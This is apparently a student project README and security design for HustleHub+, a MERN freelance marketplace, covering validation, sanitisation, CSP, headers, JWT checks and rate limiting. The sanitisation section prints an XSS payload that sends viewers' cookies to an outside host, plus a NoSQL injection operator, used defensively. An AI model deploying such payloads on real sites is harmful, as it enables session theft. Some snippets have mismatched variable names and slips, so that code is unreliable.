# HustleHub+

The HustleHub+ system is a freelance marketplace platform that facilitates the advertisement and browsing of listed services. The system processes sensitive personable identifiable and financial information related to the booking of services. This make it imperative that the system be designed and implemented in a security conscious manner to proactively mitigate and prevent attack vectors that could be leveraged to compromise its integrity. 

## Demo
### YouTube Demo Video
See the HustleHub+ Part 1 Postman Demo [Video](https://youtu.be/PlD6tQwKoPI).

### Asciinema Demo
```sh
cd backend # ensure that you're in the backend dir
npm install && npm run test # install dependencies and run tests
npm run demo # demonstrate tests, run postman collection, etc. 
```
![CLI based demonstration video](asciinema/demo.gif)

## Team Member Details
See [TEAM.md](TEAM.md) for team member details including student and group numbers.

## HustleHub+ User Matrix

| User Role      | System Description                                                                         | Core Responsibilities & Permissions                                                                                                                                                                                                                     |
| :------------- | :----------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Client**     | Standard consumers who browse, discover, and book freelance services on the platform.      | • **Browse Services:** Browse listed gigs.<br>• **Manage Bookings:** Book services and view automated booking confirmations and histories.                                                                                                              |
| **Freelancer** | Service providers who market their skills, advertise listed services, and manage bookings. | • **Gig Management:** Create, update, view, and delete their own advertised service listings.<br>• **Track Revenue:** View income generated from pending and completed bookings.<br>• **Booking Management:** View and manage incoming client bookings. |
| **Admin**      | System administrators responsible for platform health and global user management.          | • **System Monitoring:** Monitor system performance and endpoint activity.<br>• **Platform Governance:** Oversee global user accounts, active service listings, and bookings.                                                                           |


# Architecture 

The HustleHub+ system is a freelance marketplace platform that facilitates the advertisement and browsing of listed services. The system processes sensitive personable identifiable and financial information related to the booking of services. This make it imperative that the system be designed and implemented in a security conscious manner to proactively mitigate and prevent attack vectors that could be leveraged to compromise its integrity. 

The design of the system and implementation follows the MERN architecture and is comprised of the following components: 

- MongoDB - document database 
- Express(.js) - Node.js web framework 
- React(.js) - Front-end JavaScript framework
- Node(.js) - JavaScript web server (runtime)

The below diagram visualises the MERN architecture at a high-level: 

<img width="542" height="512" alt="Untitled Diagram drawio" src="https://github.com/user-attachments/assets/c50d2755-c66a-44a4-975c-474dc8f3272c" />

## Architecture diagram 

The architecture diagram illustrates the MERN architectural model and its organisation into four decoupled layers which establishes security boundaries to protect user data as it moves throughout the system: 

```mermaid 
architecture-beta
    group client[Client Layer - React frontend]
    group network[Network Security Layer]
    group server[Server Layer - Node/Express backend]
    group db[Database Layer - MongoDB]

    service ui(logos:react)[React UI Components] in client
    service rhf(lucide:form-input)[React Hook Form Context] in client
    service zod_front(lucide:file-check-2)[Zod Frontend Schemas] in client
    service axios(lucide:arrow-left-right)[Axios / Fetch Client] in client

    service tls(lucide:shield-check)[HTTPS / TLS Encryption] in network

    service helmet(lucide:hard-hat)[Helmet.js Middleware] in server
    service core_logic(logos:nodejs)[Express Controllers] in server
    service mongoose(lucide:layers)[Mongoose ODM] in server

    service mongo_db(logos:mongodb-icon)[MongoDB Cluster] in db

    ui:R -- L:rhf
    rhf:R -- L:zod_front
    rhf:B -- T:axios

    axios:B -- T:tls
    tls:B -- T:helmet

    helmet:B -- T:core_logic

    core_logic:B -- T:mongoose
    mongoose:B -- T:mongo_db
```
### Client Layer (React)

The frontend serves as the initial line of defense, focusing on input sanitization and input validation. The React User Interface (UI) components leverage React's built-in HTML encoding to automatically escape markdown or code, neutralising code injection risks [[1]](https://www.zotero.org/google-docs/?NR2v8X). The React Hook Form Context and Zod Schemas enforce client-side input validation rules [[2], [3]](https://www.zotero.org/google-docs/?e9wkI7). By validating types, lengths, and formats, the system prevents malformed payloads from causing unnecessary network traffic or server stress . The Axios client intercepts outgoing requests to uniformly attach authentication tokens (JWTs) and anti-CSRF tokens [[4]](https://www.zotero.org/google-docs/?LXz2I3).

### Network Security Layer

This layer establishes a security boundary between the untrusted public internet and the backend infrastructure. HTTPS / TLS Encryption forces all data in transit to be encrypted. This mitigates Man-in-the-Middle (MITM) attacks and ensures packet confidentiality and integrity between the client browser and the server endpoint [[5], [6]](https://www.zotero.org/google-docs/?wygNgb).

### Server Layer (Node/Express Backend)

The backend acts as the gatekeeper and final line of defence, treating all incoming client requests as fundamentally untrusted. helmet, express-validator and cors act as the backend's middleware providing server-side validation and configure HTTP response headers to force browsers to implement execution rules that mitigate clickjacking, MIME-type sniffing, and cross-origin security vulnerabilities [[7], [8], [9]](https://www.zotero.org/google-docs/?bYgTfx). The Mongoose ODM acts to serialise and parameterise data queries, mitigating NoSQL Injection and corruption of system data [[10], [11]](https://www.zotero.org/google-docs/?wO29P8).

The API project be organised into the following structure: 

```mermaid 

graph TD
    hustle_app[hustle_app]
    api[api/]
    env[.env]
    gitignore[.gitignore]
    index[index.js]
    middleware[middleware/]
    controllers[controllers/]
    routes[routes/]
    lock[package-lock.json]
    package[package.json]

    hustle_app --> api
    api --> env
    api --> gitignore
    api --> index
    api --> middleware
    api --> controllers
    api --> routes
    api --> lock
    api --> package

    %% Styling to make it look like a clean file tree
    classDef folder fill:#2d3748,stroke:#4a5568,stroke-width:2px,color:#fff;
    classDef file fill:#1a202c,stroke:#4a5568,stroke-width:1px,color:#cbd5e0;
    
    class hustle_app,api,middleware,controllers,routes folder;
    class env,gitignore,index,lock,package file;

```


| Folder       | Purpose                                                                                                                                                                                   |
| ------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| routes/      | Defines endpoint paths for client requests and maps them to controller functions                                                                                                          |
| controllers/ | Contains the logic that handles incoming requests sent to the various route endpoints and coordinates the business logic to produce appropriate system responses.                         |
| middleware/  | Contains the processing, validation and error handling logic for requests sent to the various endpoints on the server, acting as an intermediary before the controller logic is executed. |


The below sequence diagram represents a request lifecycle through the backend application, exemplifying the flow of a request before it reaches a controller:

```mermaid 
sequenceDiagram
    autonumber
    actor Client as Client (React UI / Axios)
    participant MW as Middleware (middleware/)
    participant Route as Routes (routes/)
    participant Ctrl as Controllers (controllers/)
    
    Client->>MW: 1. Incoming HTTP Request
    activate MW
    
    Note over MW: Intercepts request & checks data:<br/>- Validates structure (e.g., Zod)<br/>- Verifies access (e.g., Auth token)
    
    alt Request is INVALID / UNAUTHORISED
        Note over MW: Fails Validation
        MW-->>Client: 2a. Early Response (e.g., 400 Bad Request / 401 Unauthorized)
        Note over MW: Request cycle ends here.<br/>Routes and Controllers are never reached.
    else Request is VALID
        Note over MW: Passes Validation
        MW->>Route: 2b. next() -> Forward validated request
    end
    deactivate MW
    
    activate Route
    Note over Route: Matches URL path and HTTP method
    Route->>Ctrl: 3. Invoke assigned handler function
    deactivate Route
    
    activate Ctrl
    Note over Ctrl: Executes business logic
    Ctrl-->>Client: 4. Final HTTP Response (200 OK)
    deactivate Ctrl

```

# System Security

## Client-side Input validation

Input validation is a security consideration that will be implemented in the React front-end and acts as the first preventative security layer that stops malformed or malicious input/requests from reaching the server. However, it should be noted that client-side validation can be trivially bypassed, therefore it remains crucial to implement server-side validation and sanitisation of requests [[1]](https://www.zotero.org/google-docs/?ZXMseD).

### Type checking

Type checking ensures that input fields submitted match the exact primitive or data structure expected. This will be implemented in the Client-side application (React) using Zod to enforce primitives/data structures before submission [[3]](https://www.zotero.org/google-docs/?XXoXSi).

The following will be validated using a type checking using Zod defined schema for each primary entity within the HustleHub+ system:
#### User Entity Schema

```javascript
export const UserTypeSchema = z.object({
  id: z.string(),
  email: z.string(),
  password: z.string(),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

#### Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileTypeSchema = z.object({
  user_id: z.string(),
  first_name: z.string(),
  last_name: z.string(),
  bio: z.string(),
  phone_number: z.string(),
  hourly_rate: z.number(),
  skills: z.array(z.string()),
});
```

#### Service Entity Schema

```javascript
export const ServiceTypeSchema = z.object({
  id: z.string(),
  freelancer_id: z.string(),
  title: z.string(),
  description: z.string(),
  base_price: z.number(),
  category: z.string(),
});
```

#### Booking Entity Schema

```javascript
export const BookingTypeSchema = z.object({
  id: z.string(),
  client_id: z.string(),
  service_id: z.string(),
  scheduled_start: z.string(),
  scheduled_end: z.string(),
  status: z.string(),
  requirements_note: z.string().optional(),
});
```

#### Transaction Entity Schema

```javascript
export const TransactionTypeSchema = z.object({
  id: z.string(),
  booking_id: z.string(),
  amount: z.number(),
  currency: z.string(),
  payment_gateway_reference: z.string(),
});
```

### Length Limits

Length limits ensure that user submitted input conforms to a pre-defined length before submission to the server. The restriction of the input length supports the mitigation of denial of service attacks that leverage large inputs to reduce system responsiveness. This will be implemented in the Client-side application (React) using Zod [[3]](https://www.zotero.org/google-docs/?JbOloE).

The below Zod entity schema have been revised to showcase how the length limitations will be implemented in the validation of client-side inputs related to primary entities within the system:
#### User Entity Schema

```javascript
export const UserLengthSchema = z.object({
  id: z.string(),
  email: z.string()
    .min(5, { message: "Email must be at least 5 characters" })
    .max(254, { message: "Email cannot exceed 254 characters" }),
  password: z.string()
    .min(12, { message: "Password must be at least 12 characters" })
    .max(72, { message: "Password cannot exceed 72 characters" }),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

#### Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileLengthSchema = z.object({
  user_id: z.string(),
  first_name: z.string()
    .min(1, { message: "First name is required" })
    .max(50, { message: "First name cannot exceed 50 characters" }),
  last_name: z.string()
    .min(1, { message: "Last name is required" })
    .max(50, { message: "Last name cannot exceed 50 characters" }),
  bio: z.string()
    .max(1000, { message: "Bio cannot exceed 1000 characters" }),
  phone_number: z.string()
    .min(7, { message: "Phone number must be at least 7 characters" })
    .max(15, { message: "Phone number cannot exceed 15 characters" }),
  hourly_rate: z.number(),
  skills: z.array(z.string().min(1)),
});
```
#### Service Entity Schema

```javascript
export const ServiceLengthSchema = z.object({
  id: z.string(),
  freelancer_id: z.string(),
  title: z.string()
    .min(10, { message: "Title must be at least 10 characters" })
    .max(100, { message: "Title cannot exceed 100 characters" }),
  description: z.string()
    .min(50, { message: "Description must be at least 50 characters" })
    .max(2000, { message: "Description cannot exceed 2000 characters" }),
  base_price: z.number(),
  category: z.string(),
});
```

#### Booking Entity Schema

```javascript
export const BookingLengthSchema = z.object({
  id: z.string(),
  client_id: z.string(),
  service_id: z.string(),
  scheduled_start: z.string(),
  scheduled_end: z.string(),
  status: z.string(),
  requirements_note: z.string()
    .max(500, { message: "Requirements note cannot exceed 500 characters" })
    .optional(),
});
```

#### Transaction Entity Schema

```javascript
export const TransactionLengthSchema = z.object({
  id: z.string(),
  booking_id: z.string(),
  amount: z.number(),
  currency: z.string()
    .length(3, { message: "Currency must be exactly 3 characters" }),
  payment_gateway_reference: z.string()
    .min(10, { message: "Gateway reference must be at least 10 characters" })
    .max(128, { message: "Gateway reference cannot exceed 128 characters" }),
});
```

### Format constraints

Format constraint in terms of client-side validation refers to the process of utilising a regular expression (REGEX) to determine whether an input matches a specific pattern that constitutes valid input [[3], [12], [13]](https://www.zotero.org/google-docs/?4JvjmH). Zod has again been used for input validation using the String Formats provided by the library to implement common string format constraints on the email field of users. However, other fields such as password, phone_number have used the string primitive type with the pattern param to define a custom regex expression for validation. This provides an additional layer to client-side input validation that acts to improve the integrity of the data submitted to the server [[3]](https://www.zotero.org/google-docs/?gYe1jx).

The below Zod entity schema have been revised to showcase how format constraints will be implemented in the validation of client-side inputs related to primary entities within the system:

#### User Entity Schema

```javascript
export const UserFormatSchema = z.object({
  id: z.string(),
  email: z.string().email({ message: "Must match RFC 5322 standard layout" }),
  password: z.string().regex(/(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#\$%^&*])/, {
    message: "Must include minimum character diversity (uppercase, lowercase, number, special sign)",
  }),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

####  Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileFormatSchema = z.object({
  user_id: z.string(),
  first_name: z.string().regex(/^[A-Za-zÀ-ÿ\s'-]+\$/, { 
    message: "First name must only contain alphanumeric characters" 
  }),
  last_name: z.string().regex(/^[A-Za-zÀ-ÿ\s'-]+\$/, { 
    message: "Last name must only contain alphanumeric characters" 
  }),
  bio: z.string(),
  phone_number: z.string().regex(/^\+[1-9]\d{1,14}\$/, { 
    message: "Must adhere strictly to international E.164 configuration protocols" 
  }),
  hourly_rate: z.number().multipleOf(0.01, { 
    message: "Must be constrained to a maximum of two decimal places" 
  }),
  skills: z.array(z.string()),
});
```

--- 
### Output Escaping

Input validation and output escaping are complementary security practices. Output escaping (or encoding) transforms data so it renders safely in the destination context (HTML, URLs, JavaScript, CSS) [[14]](https://www.zotero.org/google-docs/?lpEI5i).

#### React Built-in HTML Escaping (Context aware escaping)

The default behaviour of React automatically HTML-escapes all JSX text and attribute values before rendering them to the Document Object Model (DOM) when utilising the curly braces {}. This effectively encodes dangerous characters (<, >, &, ", ') present in user input into HTML entities (&lt;, &gt;, &amp;, &quot;, &#x27;) that are safe for rendering, whereby the browser will not interpret them as markup or executable JavaScript code [[1], [14]](https://www.zotero.org/google-docs/?mZv8c3).

Fundamentally, this security implementation enforces a strict separation between data which is positioned within the curly braces for encoding and markup which is inserted into JSX tags. This is achieved at render time in the renderToString and DOM-mount pipelines whereby the React DOM render applies context aware escaping before inserting each value into the DOM, making XSS nearly impossible when rendering dynamic user generated content [[1], [14]](https://www.zotero.org/google-docs/?2RRxBR).

For instance the following will be applied to the rendering dynamic user generated content such as service reviews on the platform:

```javascript
const userReview = "<img src=x onerror='alert(1)'>";
return <div>{userComment}</div>;
```

Therefore, basic output escaping will be Incorporated by default in the client-side application. However, the default escaping provided fails to escape the output in the following cases:

- String attribute bindings
- JavaScript expressions inside dangerouslySetInnerHTML
- Event handlers from strings
    
These exceptions leave the client-application vulnerable to cross-site scripting (XSS) in the eventuality there is some failure in server-side validation that allows code/markup to be rendered within the DOM [[1], [14]](https://www.zotero.org/google-docs/?DQLmZr). In order to address these concerns manual sanitisation will be implemented, which will be discussed in greater detail later.

--- 
### Sanitisation

The default output encoding supported by React is insufficient in circumstances where the system requires raw HTML to be rendered to the DOM. The React API exposes dangerouslySetInnerHTML that enables an element's innerHTML property to be set directly bypassing the default HTML encoding mentioned above. However, in the context of the system the rendering of HTML content might be completely justified for freelancers creating service listings using Rich-text editors for purposes of formatting the content of their listing [[14], [15]](https://www.zotero.org/google-docs/?IIv2km).

However, when you pass unsanitised user input to dangerouslySetInnerHTML, you enable arbitrary code execution. Therefore sanitisation is necessary to mitigate the ACE vulnerability presented through the use of this API [[15]](https://www.zotero.org/google-docs/?1aJpTZ). The below code snippet exemplifies how dangerouslySetInnerHTML can be abused:

```javascript
function ServiceListingDisplay({ serviceListing }) {
  // UNSAFE: serviceListing might contain <script> tags or event handlers
  // serviceListing = '<img src=x onerror="fetch("https://hostname/" + document.cookies)">'
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
```

Upon failure to render the image the onerror event will fire executing the specified JavaScript payload. In the above example this will ex-filtrate the cookies of the user that views the service listing to the threat actors infrastructure.
#### DOMPurify 

Sanitisation of the user specified service listing HTML will be achieved using DOMPurify, an industry standard sanitization library. DomPurify removes event handlers, script tags and returns a safe subset of HTML elements that can be rendered in the DOM without the possibility of introducing ACE vulnerabilities [[15]](https://www.zotero.org/google-docs/?6icMxK). The below example, showcases how DOMPurify will be implemented in the client to mitigate the risk associated with the dangerouslySetInnerHTML API:

```javascript
function CommentDisplay({ userComment }) {
  const clean = DOMPurify.sanitize(userComment);
// serviceListing = '<img src=x onerror="fetch("https://hostname/" + document.cookies)">'
// DOMPurify removes the onerror attribute and returns:
// '<img src="x">'
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Furthermore, a whitelist will be defined in DOMPurify to control the type of formatting allowed for service listings. This enables fine-grained control to be exercised over the elements that a user can provide for rendering on the DOM [[15]](https://www.zotero.org/google-docs/?5djGAz). The below implementation, showcases how this may be designed in the eventuality that style tags, script tags and event tags are prohibited:

```javascript 
function DisplayServiceListing ({ serviceListingHTML }) {
  const config = {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_UNKNOWN_PROTOCOLS: false,
  };
  
  const clean = DOMPurify.sanitize(serviceListingHTML, config);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

However, it should be noted that DOMPurify cannot be relied upon exclusively to remove all XSS attack vectors and will be paired with a Content Security Policy (CSP) to improve the robustness of the system's security. Lastly, despite the implementation of back-end sanitisation, the network should never be trusted [[15]](https://www.zotero.org/google-docs/?lkyCam). Therefore, sanitisation will always occur in the React client to mitigate circumstances whereby the HTML might be modified by a proxy or intercepted during transmission before being rendered on the client [[15]](https://www.zotero.org/google-docs/?VwdnCN).

---
## Server-side input validation 

As previously mentioned client-side validation of user input is not sufficient. The system incorporates server-side input validation to account for these inadequacies, using the `express-validator` package.

### Handle Validation Errors

The middleware exposes the function `handleValidationErrors` that aggregates validation errors generated by upstream filters, blocks malformed cycles by returning an HTTP 400 Bad Request, and exposes structured error details.

```javascript 
const handleValidationErrors = (req, res, next) => {
    // If validation errors exist, return a 400 Bad Request response with the error details
    const errors = validationResult(req);

    if (!errors.isEmpty()) {
        return res.status(400).json({
            error: {
                code: 'VALIDATION_ERROR',
                message: "Invalid request data",
                details: errors.array().map((error) => ({
                    field: error.path,
                    message: error.msg,
                })),
            },
        });
    }

    next();
}
```

### Register Validation

The middleware exposes the array `registerValidation` that filters registration payloads by blocking unknown properties, enforcing email length (max 254 characters), enforcing complex passwords within an 8–128 character boundary, and restricting roles to a whitelist (**`client`**, **`freelancer`**, or **`admin`**). This ensures that user registration requests that have malformed properties do not reach controllers isolating the core system logic from malicious data structures.

```javascript 
const registerValidation = [
    rejectUnknownFields(['email', 'password', 'role']),
    body('email')
    .exists({checkFalsy: true}).withMessage('Email is required')
    .bail().trim().isLength({max:254}).withMessage('Email must not exceed 254 characters')
    .bail().isString().withMessage('Email must be a string')
    .bail().trim().isEmail().withMessage('Email must be a valid email address')
    .normalizeEmail(),

    body('password')
    .exists({checkFalsy: true}).withMessage('Password is required')
    .bail().isString().withMessage('Password must be a string')
    .bail().matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^A-Za-z0-9\s]).{8,128}$/).withMessage('Password must be complex and between 8 to 128 characters'),

    body("role")
    .optional()
    .isString().withMessage('Role must be a string')
    .bail().trim().toLowerCase().isIn(['client', 'freelancer','admin']).withMessage('Role must be either "client", "freelancer" or "admin"'),

    handleValidationErrors,
];
```

### Login Validation 

The middleware exposes the array `loginValidation` that filters login payloads by blocking unknown properties, enforcing strict email formatting requirements, and validating password presence and type constraints up to a 128-character maximum. This ensures that user login requests that have malformed properties do not reach controllers, isolating the core system logic from malicious data structures.

```javascript
const loginValidation = [
    rejectUnknownFields(['email', 'password']),
    body('email')
    .exists({checkFalsy: true}).withMessage('Email is required')
    .bail().isString().withMessage('Email must be a string')
    .bail().trim().isEmail().withMessage('Email must be a valid email address')
    .normalizeEmail(),

    body('password')
    .exists({checkFalsy: true}).withMessage('Password is required')
    .bail().isString().withMessage('Password must be a string')
    .bail().isLength({max: 128}).withMessage('Password is invalid'),

    handleValidationErrors,
];
```

### Field Count Validation 

The middleware exposes the higher-order function `rejectUnknownFields` that dynamically checks incoming requests against a whitelist of permitted fields, extracts any keys not explicitly listed inside `allowedFields`, and blocks malformed cycles by returning an HTTP 400 Bad Request. 

```javascript 
const rejectUnknownFields = (allowedFields) => {
    return (req, res, next) => {
        const unknownFields = Object.keys(req.body).filter((field) => !allowedFields.includes(field));
        if (unknownFields.length > 0) {
            return res.status(400).json({ 
                error: {
                    code: 'UNKNOWN_FIELDS',
                    message: `Request contains unsupported fields`,
                    details: unknownFields.map((field) => ({
                        field,
                        message: `Field "${field}" is not allowed`,
                    })),
                }
            });
        }
        next();
    };
};
```

### JWT Validation 

The middleware exposes the function `authenticate` that extracts JSON Web Tokens from the incoming `Authorization` header, cryptographically verifies their signatures against `JWT_SECRET`, checks expiration, and handles session identification by appending the validated user payload (`id` and `role`) directly onto the request object as `req.user`.

```javascript 
const jwt = require("jsonwebtoken");

const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;

  // Check header exists and uses "Bearer <token>" schema
  if (!authHeader || !authHeader.startsWith("Bearer "))
    return res.status(401).json({
      error: {
        code: "UNAUTHORIZED",
        message: "Authentication token missing or malformed.",
      },
    });

  const token = authHeader.split(" ")[1];

  try {
    // Verify sig & check exp using JWT_SECRET
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // Attach standard identity payload to request object
    req.user = { id: decoded.sub, role: decoded.role };

    next();
  } catch (err) {
    // Distinguish exp from other errors without leaking internals
    if (err.name == "TokenExpiredError")
      return res.status(401).json({
        error: {
          code: "TOKEN_EXPIRED",
          message: "Token has expired. Please log in again.",
        },
      });

    return res.status(401).json({
      error: {
        code: "INVALID_TOKEN",
        message: "Invalid authentication token.",
      },
    });
  }
};

module.exports = authenticate;
```
## Security Headers

The system will use various security headers to enhance the robustness of defences against attacks. The following will be discussed below: the Content Security Policy (CSP) and the various other more general security headers.
#### Content Security Policy (CSP)

Content Security Policy (CSP) is a security header that instructs the browser to block certain code origins, mitigating code injection attacks, such as XSS. Even if an attacker injects malicious HTML like `<img src=x onerror="alert(1)">`, CSP can prevent the script from executing by restricting what sources the browser trusts. The CSP is defined in the server's configuration and sent upon a client request as a CSP HTTP header [[16]](https://www.zotero.org/google-docs/?9jMnxO). The user's browser validates every resource against the policy defined in the header before rendering and subsequently execution. Upon violation of the policy the browser will block the resource preventing its execution [[8], [16], [17]](https://www.zotero.org/google-docs/?C25FTg).

The CSP of the system will be defined as follows:

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{NONCE}' https://trusted-cdn.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:; 
  connect-src 'self' https://hustle.com; 
  frame-src 'none'; 
  object-src 'none'; 
  base-uri 'self'; 
  form-action 'self'; 
  upgrade-insecure-requests;
```

- `default-src 'self'`: Only load resources from the same origin.
- `script-src 'self' 'nonce-{NONCE}'`: Allow scripts from the same origin and inline scripts with a specific nonce.
- `style-src 'self' 'unsafe-inline'`: Allow styles from the same origin and React components that use inline styles.
- `img-src 'self' data: https:`: Allow images from same origin, data URLs, and any HTTPS URL.
- `connect-src 'self' https://api.example.com`: Allow fetch/XHR only to same origin.
- `frame-src 'none'`: Block all iframes (preventing click fixing from occuring).
- `object-src 'none'`: Block `<object>` and `<embed>` tags.
- `base-uri 'self'`: Prevent scripts from changing the page's base URL.
- `form-action 'self'`: Forms can only submit to the same origin.
- `upgrade-insecure-requests`: Upgrade HTTP resources to HTTPS automatically.
#### Security Headers 

Security headers is a more general term for directives issued to browsers on how to appropriately handle content and mitigate various security threats in addition to those defined in the CSP.  The helmet middleware by default sets or removes the following security headers: 

- `Cross-Origin-Opener-Policy` - Process isolates your page by controlling whether a new top-level document opened using `Window.open()` is opened in a new browsing context group (BCG) or not. This prevents an attacker from abusing cross-origin attacks to gain access to the global object [[18]](https://www.zotero.org/google-docs/?Rss5w8). 
- `Cross-Origin-Resource-Policy` - Blocks others from loading your resources cross-origin.
- `Origin-Agent-Cluster` - Changes process isolation to be origin-based. 
- `Referrer-Policy` - Controls the Referer header. 
- `Strict-Transport-Security` - Sets a browser preference to prefer HTTPS over HTTP. 
- `X-Content-Type-Options` - Mitigates MIME sniffing attacks.
- `X-DNS-Prefetch-Control` - Controls DNS prefetching.
- `X-Download-Options` - Forces downloads to be saved (Internet Explorer only). 
- `X-Frame-Options` - Legacy header that mitigates Clickjacking attacks. 
- `X-Permitted-Cross-Domain-Policies` - Controls cross-domain behaviour for Adobe products, like Acrobat. 
- `X-Powered-By` - This header is set by default when using Express and serves not functional purpose besides identification of the framework. Helmet will implicitly remove the header, however, it's removal offers limited security benefits in terms of the identification of web server information [[8]](https://www.zotero.org/google-docs/?E6Hgfl). 
- `X-XSS-Protection` - This legacy header tries to mitigate reflected XSS attacks, by instructing the browser to use its built-in XSS filtering. Helmet sets the header to `X-XSS-Protection: 0` by default, as it has proven to be ineffective and an insecure practice by modern development standards [[8]](https://www.zotero.org/google-docs/?E6Hgfl).   

## Default error handler 

Express has a built-in error handler which is added to the end of the middle-ware function stack that catches any errors that might be encountered within the application. The built-in error handler acts as a catch all in the eventuality that an error occurs during execution without a specified custom error handler. This effectively prevents an error from bubbling up and exposing information to the client such as stack traces and error messages that could be used to inform an attack on the server during the reconnaissance phase [[19]](https://www.zotero.org/google-docs/?ckZh85).

The use of the Express default error handler has been implemented in the system by setting an environmental variable `NODE_ENV` to `production`. This ensures that the server will run in production mode, whereby response bodies will be the HTML of the status code message, instead of the error stack trace (`err.stack`) [[19]](https://www.zotero.org/google-docs/?ckZh85).

```markdown 
NODE_ENV = production
```
## Rate limiting 

The system requires that login endpoints are protected to ensure that private data is secure. Rate limiting will be incorporated to prevent authorised access attempts by limiting the number of requests made to the endpoint once certain conditions have been met. This prevents brute-force and credential stuffing attacks that could result in account compromission of user accounts [[5], [20]](https://www.zotero.org/google-docs/?10KGf1). There are two conditions that will be used to distinguish between legitimate and malicious requests:

1. The number of consecutive failed attempts by the same user name and IP address.
2. The number of failed attempts from an IP address over the period of one day. 

The `rate-limiter-flexible` package will be used for purposes of rate limiting in the system. 
The example below protects a login route against brute-force and credential-stuffing attacks by enforcing a dual-layer rate-limiting strategy using Redis. It separates defense into two boundaries: a global IP-based tracker that blocks an IP address for 24 hours after 100 total daily failures, and a targeted account-based tracker that blocks a specific Email and IP combination for 1 hour after 10 consecutive failures [[20]](https://www.zotero.org/google-docs/?ji4iTE).

```javascript 

const http = require('http');
const express = require('express');
const Redis = require('ioredis');
const { RateLimiterRedis } = require('rate-limiter-flexible');
const redisClient = new Redis({ enableOfflineQueue: false });

const maxWrongAttemptsByIPperDay = 100;
const maxConsecutiveFailsByUsernameAndIP = 10;

const limiterSlowBruteByIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_ip_per_day',
  points: maxWrongAttemptsByIPperDay,
  duration: 60 * 60 * 24,
  blockDuration: 60 * 60 * 24,
});

const limiterConsecutiveFailsByUsernameAndIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_consecutive_username_and_ip',
  points: maxConsecutiveFailsByUsernameAndIP,
  duration: 60 * 60 * 24 * 90, // Store number for 90 days since first fail
  blockDuration: 60 * 60, // Block for 1 hour
});

const getUsernameIPkey = (username, ip) => `${username}_${ip}`;

async function loginRoute(req, res) {
  const ipAddr = req.ip;
  const usernameIPkey = getUsernameIPkey(req.body.email, ipAddr);

  const [resUsernameAndIP, resSlowByIP] = await Promise.all([
    limiterConsecutiveFailsByUsernameAndIP.get(usernameIPkey),
    limiterSlowBruteByIP.get(ipAddr),
  ]);

  let retrySecs = 0;

  if (resSlowByIP !== null && resSlowByIP.consumedPoints > maxWrongAttemptsByIPperDay) {
    retrySecs = Math.round(resSlowByIP.msBeforeNext / 1000) || 1;
  } else if (resUsernameAndIP !== null && resUsernameAndIP.consumedPoints > maxConsecutiveFailsByUsernameAndIP) {
    retrySecs = Math.round(resUsernameAndIP.msBeforeNext / 1000) || 1;
  }

  if (retrySecs > 0) {
    res.set('Retry-After', String(retrySecs));
    res.status(429).send('Too Many Requests');
  } else {
    const user = authorise(req.body.email, req.body.password); 
    if (!user.isLoggedIn) {

      try {
        const promises = [limiterSlowBruteByIP.consume(ipAddr)];
        if (user.exists) {
promises.push(limiterConsecutiveFailsByUsernameAndIP.consume(usernameIPkey));
        }

        await Promise.all(promises);

        res.status(400).end('email or password is wrong');
      } catch (rlRejected) {
        if (rlRejected instanceof Error) {
          throw rlRejected;
        } else {
          res.set('Retry-After', String(Math.round(rlRejected.msBeforeNext / 1000)) || 1);
          res.status(429).send('Too Many Requests');
        }
      }
    }

    if (user.isLoggedIn) {
      if (resUsernameAndIP !== null && resUsernameAndIP.consumedPoints > 0) {
        // Reset on successful authorisation
        await limiterConsecutiveFailsByUsernameAndIP.delete(usernameIPkey);
      }

      res.end('authorized');
    }
  }
}

const app = express();

app.post('/login', async (req, res) => {
  try {
    await loginRoute(req, res);
  } catch (err) {
    res.status(500).end();
  }
});
```
## Mongoose Object Data Modelling (ODM)

In the context of MongoDB and Mongoose, code injection attacks namely NoSQL Injection, involves manipulating database queries using input from untrusted sources. The first line of defence against NoSQL Injection is input validation and sanitisation [[10]](https://www.zotero.org/google-docs/?1Uo2eY).. This will be achieved using `zod` (client-side) , `helmet`, `cors` and `express-validator`. However, on the server side Mongoose schema validation, parameterised queries and access controls will be employed to further strengthen the security position of the system against this category of attack [[10]](https://www.zotero.org/google-docs/?1Uo2eY).
### Mongoose Schema Validation 

Mongoose ODM provides schemas with built-in validation that enables the inclusion of validators for each field of the entity. Because NoSQL injection relies on forcing unexpected object types (`{"$ne": null}`) into query parameters, enforcing a rigid Mongoose Schema automatically type-casts incoming inputs into their expected schema primitives neutralising object injection attacks [[10], [11], [21]](https://www.zotero.org/google-docs/?lDRwlS).

Below is a simple example of how a freelancer Mongoose schema will be defined within the system to perform this object validation: 

```javascript 
const freeLancerSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    trim: true,
    maxlength: 50
  },
});
```

### Parameterised Queries

